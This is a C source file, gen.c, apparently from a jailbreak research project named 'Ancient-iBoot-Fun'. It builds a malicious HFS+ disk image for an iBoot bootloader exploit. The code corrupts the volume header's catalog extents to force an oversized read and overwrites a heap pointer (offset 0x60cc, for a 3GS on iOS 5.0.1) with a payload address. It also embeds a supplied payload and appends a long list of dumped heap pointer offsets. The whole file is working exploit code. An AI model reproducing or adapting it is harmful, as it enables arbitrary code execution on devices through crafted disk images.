// gen.c - from Ancient-iBoot-Fun made by JonathanSeals
/*
 * Payload at 0x1000
 * Read size 0x80000000
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <HFS.h>
#include "target.h"

#ifndef OSSwapInt32
#define OSSwapInt32 __builtin_bswap32
#endif

int main(int argc, char **argv) {
    
    if (argc < 5) {
        printf("Usage: %s (HFSVolume) (PatchedHFSVolume) (heap dump) (payload)\n", argv[0]);
        return -1;
    }
    
    char *inFile = argv[1];
    char *outFile = argv[2];
    char *memFile = argv[3];
    char *pFile = argv[4];
    
    
    if (!(inFile && outFile && pFile && memFile)) {
        return -1;
    }
    
    size_t len = 0;
    void *buf = 0;
    
    FILE *hfsdisk = fopen(inFile, "r");
    
    if (!hfsdisk) {
        printf("Failed to open %s\n", inFile);
        return -1;
    }
    
    fseek(hfsdisk, 0, SEEK_END);
    len = ftell(hfsdisk);
    fseek(hfsdisk, 0, SEEK_SET);
    
    if (!len) {
        printf("%s was empty\n", inFile);
        fclose(hfsdisk);
        return -1;
    }
    
    //Only work with the first 0x300000 bytes of the disk
    if (len > 0x300000) {
        len = 0x300000;
    }
    
    buf = (void*)malloc(len);
    bzero(buf, len);
    
    size_t read = fread(buf, 1, len, hfsdisk);
    
    if (read != len) {
        printf("Failed to read %s\n", inFile);
        fclose(hfsdisk);
        return -1;
    }
    
    HFSPlusVolumeHeader *hdr = (HFSPlusVolumeHeader*)(buf+0x400);
    
    hdr->catalogFile.extents[0].startBlock = OSSwapInt32(0x0);
    hdr->catalogFile.extents[0].blockCount = OSSwapInt32(0x0);
    hdr->catalogFile.extents[1].startBlock = OSSwapInt32(0x1);
    hdr->catalogFile.extents[1].blockCount = OSSwapInt32(0x80000);
    
    FILE *memFd = fopen(memFile, "r");
    
    if (!memFd) {
        printf("Failed to open memory dump\n");
        return -1;
    }
    
    size_t memLen = 0;
    fseek(memFd, 0, SEEK_END);
    memLen = ftell(memFd);
    fseek(memFd, 0, SEEK_SET);
    
    void *memDumpBuf = (void*)malloc(memLen);
    
    if (!memDumpBuf) {
        return -1;
    }
    
    bzero(memDumpBuf, memLen);
    
    read = fread(memDumpBuf, 1, memLen, memFd);
    
    fclose(memFd);
    
    if (read != memLen) {
        printf("Failed to read full file 0x%zx 0x%zx\n", read, memLen);
        return -1;
    }
    
    int aaa=0;
    
    //size_t text_sz =  0x33664; //0x33664
    //size_t under_sz = 0x3365c; //0x3365c
    
    //for (int i=0; i < 0x2000; i+=0x4) {
    //
    //    if (*(uint32_t*)(memDumpBuf+i) > (BASE_ADDR+under_sz) && *(uint32_t*)(memDumpBuf+i) < (BASE_ADDR+text_sz)) {
    //    printf("%x: %x\n", i,*(uint32_t*)(memDumpBuf+i));
    //    aaa++;
    //        *(uint32_t*)(memDumpBuf+i) = PAYLOAD_ADDR;
    //    }
    //
    //}
    
    //for (int i=0x6000; i < 0x10000; i+=0x4) {
    //
    //    if (*(uint32_t*)(memDumpBuf+i) > (BASE_ADDR+under_sz) && *(uint32_t*)(memDumpBuf+i) < (BASE_ADDR+text_sz)) {
    //    printf("%x: %x\n", i, *(uint32_t*)(memDumpBuf+i));
    //    aaa++;
    //        *(uint32_t*)(memDumpBuf+i) = PAYLOAD_ADDR;
    //    }
        
    //}
    
    //60cc: 4ff33660 -> PAYLOAD_ADDR
    //printf("%x: %x\n", 0x60cc, *(uint32_t*)(memDumpBuf+0x60cc));
    *(uint32_t*)(memDumpBuf+0x60cc) = PAYLOAD_ADDR; // 3gs, 5.0.1, oldbr (?)
    aaa++;
    
    printf("%d\n", aaa);
    
    FILE *payload = fopen(pFile, "r");
    
    if (!payload) {
        printf("Failed to open payload\n");
        return -1;
    }
    
    fseek(payload, 0, SEEK_END);
    size_t payloadLen = ftell(payload);
    fseek(payload, 0, SEEK_SET);
    
    void *plb = (void*)malloc(payloadLen);
    bzero(plb, payloadLen);
    
    fread(plb, payloadLen, 1, payload);
    
    fclose(payload);
    
    memcpy(buf+0x1000, memDumpBuf, memLen);
    
    //Use a NOP sled into the payload because things can be wacky sometimes
    memcpy(buf+0x1000, plb, payloadLen);
    
    free(plb);
    
    for (int i=0x1000; i < 0x1400; i+=2) {
    //    *(uint16_t*)(buf+i) = 0xbf00;
    }
    
    FILE *outF = fopen(outFile, "w");
    
    if (!outF) {
        printf("Error opening outFile\n");
        return -1;
    }
    
    size_t written = fwrite(buf, 1, len, outF);
    
    if (written != len) {
        printf("Error writing outFile %zu %zu\n", written, len);
        fclose(outF);
        return -1;
    }
    
    fclose(outF);
    free(buf);
    
    printf("Wrote patched file to %s\n", outFile);
    return 0;
}

/*
200: 4ff31cc0
20c: 4ff2f580

59c: 4ff2db20
5a0: 4ff2db20
674: 4ff2dbf0
678: 4ff2dbf0
684: 4ff30640
690: 4ff2dc0c
694: 4ff2dc0c
8f8: 4ff2a348
90c: 4ff2de30
910: 4ff2a330
914: 4ff2a340
918: 4ff2e0c4
91c: 4ff2a340
920: 4ff2a340
928: 4ff2de4c
92c: 4ff2e0b4
930: 4ff143b1
954: 4ff2ded0
958: 4ff2ded0
960: 4ff146dd
968: 4ff2df00
b24: 4ff2e0ac
b28: 4ff13acb
b2c: 4ff2de30
b30: 4ff2e0c4
b34: 4ff14335
b3c: 4ff2de30
b44: 4ff140a9
b48: 4ff2e0ec
b4c: 4ff1470b
b70: 4ff2e0f4
b74: 4ff15a03
b7c: 4ff159f1
c14: 4ff2a7c4
c18: 4ff2a408
c1c: 4ff2ab94
c20: 4ff2a570
c28: 4ff2a3fc
1424: 4ff2eb08
1440: 4ff2a020
1484: 4ff2a020
1494: 4ff20191
1498: 4ff20191
14f8: 4ff1aaf5
14fc: 4ff1ab45
1500: 4ff1ab95
1504: 4ff1aa1d
1508: 4ff1ac71
150c: 4ff1a955
1514: 4ff02031
1538: 4ff1ad91
158c: 4ff1b475
1590: 4ff1b941
1594: 4ff1c7b9
1598: 4ff1cb35
159c: 4ff1cb75
15a0: 4ff1b439
15a4: 4ff1ec29
15a8: 4ff1ed49
15ac: 4ff1f65d
15b0: 4ff1f715
15b4: 4ff1fadd
15b8: 4ff1fba5
15bc: 4ff1eb99
15c0: 4ff1fd01
15c4: 4ff200d5
15c8: 4ff20101
15d0: 4ff1eba9
15e8: 4ff1aaf5
15ec: 4ff1ab45
15f0: 4ff1ab95
15f4: 4ff1aa1d
15f8: 4ff1ac71
15fc: 4ff1a955
1604: 4ff02031
1628: 4ff1ad91
18c8: 4ff2a0a4
18d0: 4ff038f9
18d4: 4ff2ede0
18d8: 4ff2ee3c
1a78: 4ff2a094
1a80: 4ff02085
1a88: 4ff2efec
1f94: 4ff1ec29
1f98: 4ff1ed49
1f9c: 4ff1f65d
1fa0: 4ff1f715
1fa4: 4ff1fadd
1fa8: 4ff1fba5
1fac: 4ff1eb99
1fb0: 4ff1fd01
1fb4: 4ff200d5
1fb8: 4ff20101
1fc0: 4ff1eba9
4188: 4ff2d7e0
4208: 4ff2d7e0
4288: 4ff2d7e0
4308: 4ff2d7e0
4388: 4ff2d7e0
4408: 4ff31cc4
440c: 4ff2de70
4410: 4ff2c6c4
4414: 4ff2c6c4
4420: 4ff2de30
4424: 4ff2a330
4428: 4ff2a340
442c: 4ff31c04
4430: 4ff2a340
4434: 4ff2a340
443c: 4ff2c6ac
4440: 4ff31bf4
4444: 4ff143b1
4468: 4ff319e4
446c: 4ff319e4
4474: 4ff0b03d
447c: 4ff31a80
4664: 4ff31bec
4668: 4ff13acb
466c: 4ff2de30
4670: 4ff31c04
4674: 4ff14335
4678: 4ff28640
467c: 4ff2c6c4
4680: 4ff2c6b8
4684: 4ff2c6b4
4688: 4ff31c10
468c: 4ff14455
4690: 4ff2c6bc
4694: 4ff31c1c
4698: 4ff1450f
46a0: 4ff31c50
46a4: 4ff0ad45
46a8: 4ff2c690
46ac: 4ff2c6bc
46b0: 4ff2c6b0
46b4: 4ff31c58
46bc: 4ff2dbf8
46d0: 4ff31c58
46d4: 4ff31c6c
46d8: 4ff0b061
46f0: 4ff31c74
46f4: 4ff15a03
46fc: 4ff159f1
4748: 4ff2a348
474c: 4ff31984
4760: 4ff2de30
4764: 4ff2a330
4768: 4ff2a340
476c, 4ff2d57d
4778, 4ff2d57d
477c: 4ff2a330
4780, 4ff2d57d
4784: 4ff143b1
47a0: 4ff140f5
47a4, 4ff2d57d
47a8: 4ff31d24
47ac: 4ff31d24
47b4: 4ff00c15
47bc: 4ff31dc0
5ed4: 4ff294d0
5ee0: 4ff2251b
5f08: 4ff185bf
5f30: 4ff2b088
5f34: 4ff2b078
5f54: 4ff13ec5
5f60: 4ff018e1
5f74: 4ff2b0f4
5f78: 4ff2b0d0
5f7c: 4ff2b0e8
5f80: 4ff2b0e4
5f84: 4ff2b0f0
5f88: 4ff2b0ec
5f8c: 4ff2b0e0
5f90: 4ff2b114
5fb0: 4ff01b0d
5fd0: 4ff2b088
5fd4: 4ff2b078
5ff4: 4ff13ec5
6000: 4ff018e1
6004: 4ff2ef90
6014: 4ff2b0f4
6018: 4ff2b0d0
601c: 4ff2b0e8
6020: 4ff2b0e4
6024: 4ff2b0f0
6028: 4ff2b0ec
602c: 4ff2b0e0
6030: 4ff2b114
6050: 4ff01b0d
607c: 4ff0488b
608c: 4ff048d9
6098: 4ff2ef90
60a4: 4ff2ef90
60b0: 4ff144e7
60b4: 4ff2ef90
60c4: 4ff2ef90
60e0: 4ff047df
60ec: 4ff04371
60f4: 4ff2ef90
6100: 4ff2b8b0
6108: 4ff04489
6120: 4ff1a669
6124: 4ff2ef90
6138: 4ff0257b
6158: 4ff17821
6164: 4ff2e370
616c: 4ff1734b
6174: 4ff0abbf
6190: 4ff0ac67
619c: 4ff13b7b
61a8: 4ff2197b
61b4: 4ff21865
61e0: 4ff28ea0
6230: 4ff21929
6238: 4ff21955
6240: 4ff21901
6254: 4ff28e69
625c: 4ff2c69c
6268: 4ff2d57c
6270: 4ff2ca40
6278: 4ff0d58f
6280: 4ff2d57c
62a0: 4ff0daab
62ac: 4ff2d49c
62b8: 4ff2d57c
62d4: 4ff2ca40
62e4: 4ff2ad9c
62ec: 4ff2d260
62fc: 4ff0d6f1
6304: 4ff2d57c
6318: 4ff2d77c
6320: 4ff0e7f7
6328: 4ff28e28
632c: 4ff226ac
6330: 4ff2ad94
6338: 4ff17d5b
6340: 4ff226ac
6348: 4ff2a310
6358: 4ff00861
6390: 4ff228d3
6394: 4ff04dbb
639c: 4ff04ffd
63a8: 4ff142f7
63ac: 4ff2bfbe
63b0: 4ff2a0c0
63b4: 4ff2bf90
63c0: 4ff04d53
63ec: 4ff30340
63f8: 4ff008cf
6400: 4ff008a9
6404: 4ff2a004
6408: 4ff2a004
6410: 4ff00e77
6434: 4ff15a03
643c: 4ff159f1
64a0: 4ff28e41
64a4: 4ff163d5
64a8: 4ff0c64d
64ac: 4ff16479
64b0: 4ff16415
64d8: 4ff06ba1
64dc: 4ff06c49
64e0: 4ff06f15
6588: 4ff0cced
658c: 4ff0ccfd
6590: 4ff0cd0d
6594: 4ff0cd39
6598: 4ff0cd7d
6608: 4ff19dcd
660c: 4ff19dc9
6610: 4ff19dd5
6614: 4ff19de1
6618: 4ff19e05
661c: 4ff19e2d
6688: 4ff17a25
668c: 4ff17aa5
6690: 4ff17aad
6694: 4ff17ab9
6698: 4ff17ac5
669c: 4ff17ad1
66a0: 4ff17ad9
66a4: 4ff17ae5
66a8: 4ff17a2d
66ac: 4ff17b19
66b0: 4ff17b29
6708: 4ff18db1
670c: 4ff18e45
6710: 4ff18f6d
6714: 4ff19015
6718: 4ff190d9
671c: 4ff19175
6720: 4ff192b5
6724: 4ff1931d
6728: 4ff18da1
672c: 4ff193e1
6730: 4ff191e1
6734: 4ff193e9
6738: 4ff18da9
297
*/
